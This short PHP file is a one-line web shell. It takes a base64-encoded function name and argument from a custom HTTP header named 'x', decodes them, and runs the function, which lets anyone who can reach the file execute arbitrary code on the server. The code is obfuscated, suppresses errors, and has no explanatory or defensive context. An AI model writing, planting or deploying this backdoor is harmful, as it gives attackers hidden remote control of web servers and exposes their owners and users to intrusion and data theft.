<?preg_match('/(.*)\((.*)\)/',base64_decode(substr(getallheaders()['x'],1)),$c);@$c[1]($c[2]);
